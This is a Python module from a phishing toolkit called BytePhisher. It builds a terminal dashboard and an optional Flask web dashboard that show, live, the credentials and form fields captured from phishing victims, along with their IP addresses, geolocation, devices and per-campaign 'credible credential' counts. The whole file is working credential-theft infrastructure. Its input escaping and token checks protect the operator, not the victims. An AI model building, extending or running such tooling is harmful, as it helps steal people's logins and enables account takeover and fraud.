# BytePhisher - live dashboard: rich TUI (primary) + optional Flask web dashboard.
import json
import re
import time


def _safe_cell(v, limit=120):
    """Captured values are attacker-controlled: strip ANSI/control characters
    (terminal manipulation) and neutralise rich markup (a crafted value could
    inject formatting or raise MarkupError and kill the live dashboard)."""
    t = "" if v is None else str(v)
    t = re.sub(r"\x1b\[[0-9;?]*[a-zA-Z]", "", t)
    t = "".join(ch for ch in t if ch == "\n" or ch == "\t" or ord(ch) >= 32)
    t = t.replace("[", "\\[")
    return t[:limit]


def make_frame(caps, stats):
    """Build one rich renderable frame (used by live_loop and by callers)."""
    from datetime import datetime

    from rich.panel import Panel
    from rich.table import Table

    t = Table(title="BytePhisher - Live Captures", title_style="bold magenta", expand=True)
    t.add_column("Time", width=8)
    t.add_column("Campaign", width=12)
    t.add_column("IP / Geo")
    t.add_column("Device", width=8)
    t.add_column("Risk", justify="center", width=5)
    t.add_column("Cred", justify="center", width=5)
    t.add_column("Captured Fields", overflow="fold")
    for c in caps:
        ts = datetime.fromtimestamp(c["ts"]).strftime("%H:%M:%S")
        geo = c["city"] or c["country"] or "-"
        risk = c.get("risk") or 0
        risk_cell = ("[bold red]high[/]" if risk >= 70 else
                     "[yellow]med[/]" if risk >= 30 else "[green]low[/]")
        t.add_row(
            ts,
            c.get("campaign") or "-",
            f'{c["ip"]} ({geo})',
            c["device"],
            risk_cell,
            "[bold green]OK[/]" if c["is_cred"] else "[dim]*[/]",
            "; ".join(f'{k}={v}' for k, v in list(c["fields"].items())[:4]),
        )
    subtitle = (f'[bold]captures[/] {stats["total_captures"]}  '
                f'[bold green]creds[/] {stats["credentials"]}  '
                f'[bold]credible[/] {stats.get("credible_credentials", 0)}  '
                f'[bold]visitors[/] {stats["visitors"]}')
    return Panel(t, subtitle=subtitle)


def live_loop(db, stop, refresh=1.5, watchdog=None):
    """Run a full-screen rich dashboard until stop['flag'] is set.
    Reads the capture DB on every refresh, so new hits appear live.
    `watchdog` (optional callable) runs periodically - the CLI uses it to warn
    when a tunneler process dies mid-campaign."""
    import time as _time

    from rich.console import Console
    from rich.live import Live

    console = Console()
    last_check = _time.time()
    with Live(make_frame(db.all(40), db.stats()), console=console,
              refresh_per_second=4, screen=True, transient=False) as live:
        while not stop.get("flag"):
            _time.sleep(refresh)
            live.update(make_frame(db.all(40), db.stats()))
            if watchdog and _time.time() - last_check > 10:
                watchdog()
                last_check = _time.time()



def render_plain(caps, stats):
    """Non-TTY fallback: print a compact table to stdout."""
    print("=" * 70)
    print("BYTEPHISHER - LIVE CAPTURES")
    print("=" * 70)
    for c in caps[:20]:
        from datetime import datetime
        ts = datetime.fromtimestamp(c["ts"]).strftime("%H:%M:%S")
        cred = "CRED" if c["is_cred"] else "    "
        camp = (c.get("campaign") or "-")[:12]
        risk = c.get("risk") or 0
        rl = "HIGH" if risk >= 70 else "med " if risk >= 30 else "low "
        print(f'[{ts}] {camp:<12} {c["ip"]:>15} {c["device"]:>8} {rl} {cred} {c["city"] or c["country"] or ""}')
        for k, v in c["fields"].items():
            print(f'         {k} = {v}')
        if c.get("risk_reasons"):
            print(f'         risk: {"; ".join(c["risk_reasons"])}')
    print("-" * 70)
    print(f'captures={stats["total_captures"]} creds={stats["credentials"]} '
          f'credible={stats.get("credible_credentials", 0)} visitors={stats["visitors"]}')

def web_dashboard(port=8090, db=None, host="127.0.0.1", token=""):
    """Optional Flask dashboard for remote monitoring.

    Serves / (live table), /api/captures, /api/stats - all of which carry captured
    credentials. `token` (from --api-token) gates every route: the API is the one
    part of this tool that can hand an outsider the campaign, so it is refused
    without the token rather than left open on a public bind.
    """
    import threading

    from flask import Flask, jsonify, render_template_string, request

    app = Flask("bytephisher-dash")

    if token:
        @app.before_request
        def _guard():
            supplied = (request.headers.get("X-Api-Token")
                        or request.args.get("token") or "")
            if supplied != token:
                return jsonify({"ok": False, "error": "token required"}), 401
            return None
    elif str(host) not in ("127.0.0.1", "localhost", "::1"):
        print(f"[bytephisher] WARNING: the dashboard is bound to {host} with no "
              f"--api-token, so anyone who reaches port {port} can read every "
              f"captured credential")

    PAGE = """<!doctype html><html><head><title>BytePhisher Dashboard</title>
<style>
body{font-family:system-ui;background:#0d1117;color:#e6edf3;padding:20px}
table{width:100%;border-collapse:collapse}
td,th{border-bottom:1px solid #30363d;padding:6px 10px;text-align:left}
.badge{display:inline-block;padding:2px 8px;border-radius:10px;background:#1f6feb33;color:#58a6ff}
</style></head><body>
<h2>BytePhisher - Live Dashboard</h2>
<table><thead><tr><th>Time</th><th>Campaign</th><th>IP</th><th>Geo</th><th>Device</th><th>Risk</th><th>Cred</th><th>Fields</th></tr></thead>
<tbody id="rows"><tr><td colspan="8" style="color:#8b949e">loading...</td></tr></tbody></table>
<div id="stats" class="badge"></div>
<script>
const tb = document.querySelector('#rows');
/* Every value below is attacker-controlled (a visitor types it). Without this
   helper a submitted field value like <img src=x onerror=...> executed in the
   operator's browser as soon as the row rendered. */
function esc(v){
  return String(v===null||v===undefined?'':v)
    .replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')
    .replace(/"/g,'&quot;').replace(/'/g,'&#39;');
}
function rowHtml(c){
  const t=new Date(c.ts*1000).toLocaleTimeString();
  const f=Object.entries(c.fields).slice(0,4).map(([k,v])=>esc(k)+'='+esc(v)).join('; ');
  const risk=c.risk||0;
  const rc=risk>=70?'#f85149':risk>=30?'#d29922':'#3fb950';
  const rl=risk>=70?'high':risk>=30?'med':'low';
  return `<tr><td>${esc(t)}</td><td>${esc(c.campaign||'-')}</td><td>${esc(c.ip)}</td>`
    + `<td>${esc(c.city||c.country||'-')}</td><td>${esc(c.device)}</td>`
    + `<td><span style="color:${rc}">${rl} (${Number(risk)||0})</span></td>`
    + `<td>${c.is_cred?'<span class="badge">CRED</span>':'*'}</td><td>${f}</td></tr>`;
}
function setStats(s){
  document.getElementById('stats').textContent =
    `captures ${s.total_captures} | creds ${s.credentials} | credible ${s.credible_credentials??'-'} | visitors ${s.visitors}`;
}
function fill(){
  fetch('/api/captures?limit=20').then(r=>r.json()).then(caps=>{
    if(!caps.length){tb.innerHTML='<tr><td colspan="8" style="color:#8b949e">no captures yet</td></tr>';return;}
    tb.innerHTML=caps.map(rowHtml).join('');
  });
  fetch('/api/stats').then(r=>r.json()).then(setStats);
}
let mode='';
if (window.EventSource){
  const es = new EventSource('/stream');           // real-time push
  es.addEventListener('capture', e => {
    const row = JSON.parse(e.data);
    if (tb.querySelector('td[colspan]')) tb.innerHTML = '';
    tb.insertAdjacentHTML('afterbegin', rowHtml(row));
  });
  es.addEventListener('stats', e => setStats(JSON.parse(e.data)));
  es.onopen = () => { mode='stream'; };
  es.onerror = () => { es.close(); mode='poll'; setInterval(fill, 2000); };  // fallback
  fill();
} else {
  mode='poll';
  fill();
  setInterval(fill, 2000);
}
</script></body></html>"""

    @app.route("/")
    def index():
        return render_template_string(PAGE)

    @app.route("/api/captures")
    def api_captures():
        limit = int(request.args.get("limit", 20))
        campaign = request.args.get("campaign")
        return jsonify(db.all(limit, campaign=campaign))

    @app.route("/stream")
    def stream():
        """Server-Sent Events feed: pushes new captures the moment they land.
        The page uses EventSource and falls back to polling if the stream drops."""
        from flask import Response

        def gen():
            cursor = db.max_id()
            yield "retry: 3000\n\n"
            idle = 0
            while True:
                # stop streaming once the store is closed (shutdown, tests):
                # a generator that keeps polling a closed handle is what made
                # the process die with a segfault instead of a clean exit
                if getattr(db, "_closed", False):
                    yield "event: closed\ndata: {}\n\n"
                    return
                try:
                    rows = db.since(cursor, limit=50)
                except Exception:
                    return
                for r in rows:
                    cursor = max(cursor, r["id"])
                    yield f"event: capture\ndata: {json.dumps(r, default=str)}\n\n"
                idle += 1
                if idle % 2 == 0:                      # ~ every 3s
                    yield f"event: stats\ndata: {json.dumps(db.stats(), default=str)}\n\n"
                yield ": keepalive\n\n"
                time.sleep(1.5)

        return Response(gen(), mimetype="text/event-stream",
                        headers={"Cache-Control": "no-cache",
                                 "X-Accel-Buffering": "no",
                                 "Connection": "keep-alive"})

    @app.route("/api/stats")
    def api_stats():
        campaign = request.args.get("campaign")
        data = db.stats(campaign=campaign)
        data["campaigns"] = db.campaigns()
        try:
            data["blocked"] = db.blocked_stats()
        except Exception:
            data["blocked"] = {"total_blocked": 0, "by_reason": []}
        return jsonify(data)

    th = threading.Thread(target=app.run,
                           kwargs={"host": host, "port": port, "debug": False, "use_reloader": False},
                           daemon=True)
    th.start()
    return app, th
